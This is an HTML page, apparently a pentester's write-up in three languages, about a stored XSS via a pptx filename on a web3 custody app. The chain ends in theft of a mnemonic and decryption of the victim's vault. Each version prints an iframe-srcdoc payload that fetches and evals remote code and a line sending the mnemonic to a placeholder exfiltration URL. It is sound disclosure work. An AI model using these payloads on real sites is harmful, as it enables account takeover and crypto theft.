@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Stored XSS to Full Account Takeover | coaglio</title>
+    <link rel="icon" type="image/x-icon" href="../skull.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&family=Press+Start+2P&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="writeup.css">
+</head>
+
+<body>
+    <div class="grain"></div>
+
+    <main class="frame">
+        <nav class="site-nav">
+            <a href="../" class="nav-logo">coaglio</a>
+            <div class="nav-right">
+                <div class="nav-links">
+                    <a href="../" data-i18n="nav-home">home</a>
+                    <a href="./" class="active" data-i18n="nav-writeups">writeups</a>
+                    <a href="../htb/" data-i18n="nav-htb">htb</a>
+                </div>
+                <div class="lang-switcher">
+                    <button class="lang-btn active" data-lang="en" onclick="setWriteupLang('en')">EN</button>
+                    <button class="lang-btn" data-lang="pt" onclick="setWriteupLang('pt')">PT</button>
+                    <button class="lang-btn" data-lang="es" onclick="setWriteupLang('es')">ES</button>
+                </div>
+            </div>
+        </nav>
+
+        <a href="./" class="back-link">&larr; <span data-i18n="back-writeups">back to writeups</span></a>
+
+        <!-- ==================== ENGLISH ==================== -->
+        <article class="writeup-content" id="content-en">
+            <header class="writeup-header">
+                <h1>Stored XSS to Full Account Takeover on a Web3 Custody Platform</h1>
+                <div class="writeup-meta">
+                    <time>Apr 2026</time>
+                    <div class="writeup-tags">
+                        <span class="tag">xss</span>
+                        <span class="tag">web3</span>
+                        <span class="tag">pentest</span>
+                        <span class="tag">account takeover</span>
+                    </div>
+                </div>
+            </header>
+
+            <div class="card writeup-body">
+                <h2>tl;dr</h2>
+                <p>
+                    found a stored xss on a web3 custody app through the filename of a pptx upload.
+                    ended up walking the React fiber tree in memory, grabbed the victim's 24-word mnemonic,
+                    and from there it was game over. full vault access, decrypted all their files.
+                </p>
+
+                <h2>what was this thing</h2>
+                <p>
+                    so the app was basically a web3 file vault. you upload files, they get encrypted
+                    client-side with keys derived from your hd wallet. React SPA, serverless backend,
+                    the whole deal. the important bit: the mnemonic only existed in memory. never
+                    touched disk, never hit an api. just sitting there in React state.
+                </p>
+                <p>
+                    that detail matters later.
+                </p>
+
+                <h2>getting in</h2>
+                <p>
+                    i spent a while reversing the minified js bundle (fun times) and found this component
+                    that renders pptx files, basically a built-in document viewer. and yeah, it was using
+                    <code>dangerouslySetInnerHTML</code>. classic.
+                </p>
+                <p>
+                    traced the flow back and noticed the <strong>filename</strong> gets shoved into
+                    a template literal before it even reaches the sanitizer. so the filename is basically
+                    treated as trusted content. spoiler: it shouldn't be.
+                </p>
+
+                <h2>bypassing the sanitizer</h2>
+                <p>
+                    they had a regex-based sanitizer running on the rendered output, but the injection
+                    point was the filename, which got processed before the sanitizer could do anything useful.
+                </p>
+                <p>
+                    the bypass was pretty simple honestly. shove an <code>&lt;iframe srcdoc&gt;</code>
+                    with html-encoded entities into the filename:
+                </p>
+                <pre><code>&lt;iframe srcdoc="&amp;lt;script&amp;gt;fetch(PAYLOAD_URL).then(r=&gt;r.text()).then(eval)&amp;lt;/script&amp;gt;"&gt;</code></pre>
+                <p>
+                    sanitizer sees encoded stuff, thinks it's fine, lets it through. browser renders
+                    the srcdoc, decodes everything, and boom. script execution. and since the actual payload
+                    gets fetched from an external url, the filename length doesn't matter at all.
+                </p>
+
+                <h2>the fun part: stealing from React's brain</h2>
+                <p>
+                    ok so now i have js execution. cool. but where's the mnemonic? not in localstorage.
+                    not in cookies. not in any api response i could intercept. it literally only exists
+                    inside React's internal state. in ram.
+                </p>
+                <p>
+                    so i wrote a payload that walks the React fiber tree, the internal data
+                    structure React uses to keep track of component state. basically crawling through
+                    every component's state looking for something that looks like a bip39 mnemonic.
+                    you filter for valid bip39 words and eventually you find it.
+                </p>
+                <p>
+                    24 words. the whole wallet. exfil was dead simple:
+                </p>
+                <pre><code>new Image().src = EXFIL_URL + "?m=" + encodeURIComponent(mnemonic);</code></pre>
+
+                <h2>going all the way</h2>
+                <p>
+                    with the mnemonic in hand the rest was just following the app's own logic:
+                </p>
+                <ol>
+                    <li>derive the private key (same pbkdf2 params: 200k iterations, sha-256, username as salt)</li>
+                    <li>sign an eip-191 message to auth against the api</li>
+                    <li>list every file in the victim's vault</li>
+                    <li>download + decrypt everything with the derived aes-gcm keys</li>
+                </ol>
+                <p>
+                    tested on 3 accounts. worked every time. on one of them i decrypted a file
+                    that was literally called something like "PrivateKey.txt" and yeah... it was
+                    a private key to another wallet. can't make this up.
+                </p>
+
+                <h2>impact</h2>
+                <p>
+                    victim opens a shared pptx. that's it. no extra clicks, no weird prompts,
+                    nothing. just open the file and the attacker gets:
+                </p>
+                <ul>
+                    <li>your full 24-word mnemonic</li>
+                    <li>can derive all your keys, sign whatever</li>
+                    <li>download and decrypt every file you have</li>
+                    <li>complete account takeover</li>
+                </ul>
+
+                <h2>what i think about this</h2>
+                <p>
+                    some stuff that stuck with me after this one:
+                </p>
+                <ul>
+                    <li><code>dangerouslySetInnerHTML</code> keeps earning its name</li>
+                    <li>people forget filenames are user input too</li>
+                    <li>"it's only in memory so it's safe"... no it's not, xss can read react state</li>
+                    <li>fiber tree traversal is actually a legit post-xss technique, not just a ctf trick</li>
+                    <li><code>iframe srcdoc</code> + encoded entities is a nice way past regex sanitizers</li>
+                </ul>
+            </div>
+        </article>
+
+        <!-- ==================== PORTUGUÊS ==================== -->
+        <article class="writeup-content" id="content-pt" style="display:none;">
+            <header class="writeup-header">
+                <h1>Stored XSS até Account Takeover Completo em Plataforma Web3 de Custódia</h1>
+                <div class="writeup-meta">
+                    <time>Abr 2026</time>
+                    <div class="writeup-tags">
+                        <span class="tag">xss</span>
+                        <span class="tag">web3</span>
+                        <span class="tag">pentest</span>
+                        <span class="tag">account takeover</span>
+                    </div>
+                </div>
+            </header>
+
+            <div class="card writeup-body">
+                <h2>resumão</h2>
+                <p>
+                    achei um stored xss num app web3 de custódia pelo nome do arquivo de um upload pptx.
+                    com isso consegui andar pela fiber tree do React na memória, peguei a mnemônica de
+                    24 palavras da vítima, e dali foi ladeira abaixo. acesso total ao cofre, decriptei
+                    todos os arquivos.
+                </p>
+
+                <h2>o que era o app</h2>
+                <p>
+                    basicamente um cofre de arquivos web3. tu sobe arquivo, ele criptografa client-side
+                    com chaves derivadas da tua hd wallet. SPA React, backend serverless, o combo de sempre.
+                    o detalhe importante: a mnemônica só existia em memória. nunca ia pro disco, nunca
+                    passava por api nenhuma. ficava ali no state do React.
+                </p>
+                <p>
+                    guarda essa info.
+                </p>
+
+                <h2>achando a entrada</h2>
+                <p>
+                    passei um tempo revertendo o bundle js minificado (divertidíssimo) e achei um componente
+                    que renderiza arquivos pptx, tipo um visualizador embutido. e sim, ele usava
+                    <code>dangerouslySetInnerHTML</code>. clássico.
+                </p>
+                <p>
+                    tracei o fluxo de volta e vi que o <strong>nome do arquivo</strong> era jogado
+                    direto num template literal antes de chegar no sanitizador. ou seja, o filename
+                    era tratado como conteúdo confiável. spoiler: não deveria.
+                </p>
+
+                <h2>passando pelo sanitizador</h2>
+                <p>
+                    eles tinham um sanitizador baseado em regex rodando no output renderizado, mas
+                    o ponto de injeção era o filename, que passava antes do sanitizador fazer qualquer coisa útil.
+                </p>
+                <p>
+                    o bypass foi até simples. mete um <code>&lt;iframe srcdoc&gt;</code>
+                    com entidades html encoded no nome do arquivo:
+                </p>
+                <pre><code>&lt;iframe srcdoc="&amp;lt;script&amp;gt;fetch(PAYLOAD_URL).then(r=&gt;r.text()).then(eval)&amp;lt;/script&amp;gt;"&gt;</code></pre>
+                <p>
+                    sanitizador vê tudo encoded, acha que tá safe, deixa passar. browser renderiza
+                    o srcdoc, decodifica tudo, e pronto. execução de script. e como o payload real
+                    vem de uma url externa, o tamanho do filename nem importa.
+                </p>
+
+                <h2>a parte boa: roubando do cérebro do React</h2>
+                <p>
+                    beleza, tenho execução de js. massa. mas cadê a mnemônica? não tá no localstorage.
+                    não tá nos cookies. não tá em resposta de api nenhuma. ela literalmente só existe
+                    dentro do state interno do React. na ram.
+                </p>
+                <p>
+                    então escrevi um payload que anda pela fiber tree do React, a estrutura de dados
+                    interna que o React usa pra rastrear o state de cada componente. basicamente
+                    vasculhando o state de tudo procurando algo que pareça uma mnemônica bip39.
+                    filtra pelas palavras válidas e eventualmente acha.
+                </p>
+                <p>
+                    24 palavras. a wallet inteira. exfiltrar foi a parte mais fácil:
+                </p>
+                <pre><code>new Image().src = EXFIL_URL + "?m=" + encodeURIComponent(mnemonic);</code></pre>
+
+                <h2>indo até o fim</h2>
+                <p>
+                    com a mnemônica em mãos o resto foi só seguir a lógica do próprio app:
+                </p>
+                <ol>
+                    <li>derivar a chave privada (mesmos params pbkdf2: 200k iterações, sha-256, username como salt)</li>
+                    <li>assinar uma msg eip-191 pra autenticar na api</li>
+                    <li>listar todos os arquivos do cofre da vítima</li>
+                    <li>baixar + decriptar tudo com as chaves aes-gcm derivadas</li>
+                </ol>
+                <p>
+                    testei em 3 contas. funcionou em todas. numa delas decriptei um arquivo que
+                    chamava algo tipo "ChavePrivada.txt" e... era uma chave privada de outra wallet.
+                    não dá pra inventar essas coisas.
+                </p>
+
+                <h2>impacto</h2>
+                <p>
+                    vítima abre um pptx compartilhado. só isso. sem clique extra, sem prompt estranho,
+                    nada. abre o arquivo e o atacante ganha:
+                </p>
+                <ul>
+                    <li>tua mnemônica completa de 24 palavras</li>
+                    <li>pode derivar todas as chaves, assinar o que quiser</li>
+                    <li>baixar e decriptar todo arquivo do cofre</li>
+                    <li>account takeover completo</li>
+                </ul>
+
+                <h2>o que ficou na cabeça</h2>
+                <p>
+                    umas coisas que eu levo desse teste:
+                </p>
+                <ul>
+                    <li><code>dangerouslySetInnerHTML</code> continua fazendo jus ao nome</li>
+                    <li>galera esquece que nome de arquivo também é input de usuário</li>
+                    <li>"tá só em memória então tá seguro"... não tá, xss lê state do React</li>
+                    <li>fiber tree traversal é técnica real pós-xss, não é só coisa de ctf</li>
+                    <li><code>iframe srcdoc</code> + entidades encoded passa fácil por sanitizador regex</li>
+                </ul>
+            </div>
+        </article>
+
+        <!-- ==================== ESPAÑOL ==================== -->
+        <article class="writeup-content" id="content-es" style="display:none;">
+            <header class="writeup-header">
+                <h1>Stored XSS hasta Account Takeover Completo en Plataforma Web3 de Custodia</h1>
+                <div class="writeup-meta">
+                    <time>Abr 2026</time>
+                    <div class="writeup-tags">
+                        <span class="tag">xss</span>
+                        <span class="tag">web3</span>
+                        <span class="tag">pentest</span>
+                        <span class="tag">account takeover</span>
+                    </div>
+                </div>
+            </header>
+
+            <div class="card writeup-body">
+                <h2>resumen</h2>
+                <p>
+                    encontré un stored xss en una app web3 de custodia por el nombre de archivo de un
+                    upload pptx. con eso pude recorrer el fiber tree de React en memoria, agarré la
+                    mnemónica de 24 palabras de la víctima, y de ahí fue todo cuesta abajo. acceso
+                    total a la bóveda, descifré todos los archivos.
+                </p>
+
+                <h2>qué era la app</h2>
+                <p>
+                    básicamente una bóveda de archivos web3. subís archivos, se cifran client-side
+                    con claves derivadas de tu hd wallet. SPA React, backend serverless, lo típico.
+                    el detalle importante: la mnemónica solo existía en memoria. nunca tocaba disco,
+                    nunca pasaba por ninguna api. ahí sentada en el state de React.
+                </p>
+                <p>
+                    acordate de eso.
+                </p>
+
+                <h2>encontrando la entrada</h2>
+                <p>
+                    estuve un rato revirtiendo el bundle js minificado (re divertido) y encontré un
+                    componente que renderiza archivos pptx, como un visualizador integrado. y sí,
+                    usaba <code>dangerouslySetInnerHTML</code>. clásico.
+                </p>
+                <p>
+                    tracé el flujo para atrás y vi que el <strong>nombre del archivo</strong> se
+                    metía directo en un template literal antes de llegar al sanitizador. o sea,
+                    el filename se trataba como contenido confiable. spoiler: no debería.
+                </p>
+
+                <h2>pasando el sanitizador</h2>
+                <p>
+                    tenían un sanitizador basado en regex corriendo sobre el output renderizado,
+                    pero el punto de inyección era el filename, que se procesaba antes de que el
+                    sanitizador pudiera hacer algo útil.
+                </p>
+                <p>
+                    el bypass fue bastante simple la verdad. metés un <code>&lt;iframe srcdoc&gt;</code>
+                    con entidades html encoded en el nombre del archivo:
+                </p>
+                <pre><code>&lt;iframe srcdoc="&amp;lt;script&amp;gt;fetch(PAYLOAD_URL).then(r=&gt;r.text()).then(eval)&amp;lt;/script&amp;gt;"&gt;</code></pre>
+                <p>
+                    el sanitizador ve todo encoded, piensa que está bien, lo deja pasar. el browser
+                    renderiza el srcdoc, decodifica todo, y listo. ejecución de script. y como el
+                    payload real viene de una url externa, el largo del filename ni importa.
+                </p>
+
+                <h2>la parte buena: robando del cerebro de React</h2>
+                <p>
+                    ok, tengo ejecución de js. bien. pero dónde está la mnemónica? no está en
+                    localstorage. no está en cookies. no está en ninguna respuesta de api. literalmente
+                    solo existe dentro del state interno de React. en ram.
+                </p>
+                <p>
+                    así que escribí un payload que recorre el fiber tree de React, la estructura de
+                    datos interna que React usa para trackear el state de cada componente. básicamente
+                    revisando el state de todo buscando algo que parezca una mnemónica bip39. filtrás
+                    por palabras válidas y eventualmente la encontrás.
+                </p>
+                <p>
+                    24 palabras. la wallet entera. exfiltrar fue lo más fácil:
+                </p>
+                <pre><code>new Image().src = EXFIL_URL + "?m=" + encodeURIComponent(mnemonic);</code></pre>
+
+                <h2>yendo hasta el final</h2>
+                <p>
+                    con la mnemónica en mano el resto fue seguir la lógica de la propia app:
+                </p>
+                <ol>
+                    <li>derivar la clave privada (mismos params pbkdf2: 200k iteraciones, sha-256, username como salt)</li>
+                    <li>firmar un msg eip-191 para autenticar contra la api</li>
+                    <li>listar todos los archivos de la bóveda de la víctima</li>
+                    <li>descargar + descifrar todo con las claves aes-gcm derivadas</li>
+                </ol>
+                <p>
+                    probé en 3 cuentas. funcionó en todas. en una descifré un archivo que se
+                    llamaba algo como "ClavePrivada.txt" y... era una clave privada de otra wallet.
+                    no se puede inventar esto.
+                </p>
+
+                <h2>impacto</h2>
+                <p>
+                    la víctima abre un pptx compartido. eso es todo. sin clic extra, sin prompt
+                    raro, nada. abrís el archivo y el atacante obtiene:
+                </p>
+                <ul>
+                    <li>tu mnemónica completa de 24 palabras</li>
+                    <li>puede derivar todas las claves, firmar lo que quiera</li>
+                    <li>descargar y descifrar todo archivo de la bóveda</li>
+                    <li>account takeover completo</li>
+                </ul>
+
+                <h2>lo que me quedó</h2>
+                <p>
+                    algunas cosas que me llevo de este test:
+                </p>
+                <ul>
+                    <li><code>dangerouslySetInnerHTML</code> sigue haciendo honor a su nombre</li>
+                    <li>la gente se olvida que el nombre de archivo también es input de usuario</li>
+                    <li>"está solo en memoria así que está seguro"... no, no lo está, xss lee el state de React</li>
+                    <li>fiber tree traversal es una técnica real post-xss, no es solo cosa de ctf</li>
+                    <li><code>iframe srcdoc</code> + entidades encoded pasa fácil por sanitizadores regex</li>
+                </ul>
+            </div>
+        </article>
+
+        <a href="./" class="back-link">&larr; <span data-i18n="back-writeups">back to writeups</span></a>
+
+        <footer class="foot">
+            <p>&copy; <span id="copyright-year">2025</span> coaglio.</p>
+        </footer>
+    </main>
+
+    <script src="../i18n.js"></script>
+    <script>
+        function setWriteupLang(lang) {
+            document.querySelectorAll(".writeup-content").forEach(el => el.style.display = "none");
+            const target = document.getElementById("content-" + lang);
+            if (target) target.style.display = "block";
+            document.documentElement.lang = lang;
+            localStorage.setItem("lang", lang);
+            document.querySelectorAll(".lang-btn").forEach(btn => {
+                btn.classList.toggle("active", btn.dataset.lang === lang);
+            });
+        }
+
+        const saved = localStorage.getItem("lang") || "en";
+        setWriteupLang(saved);
+        document.getElementById("copyright-year").textContent = new Date().getFullYear();
+    </script>
+
+</body>
+
+</html>
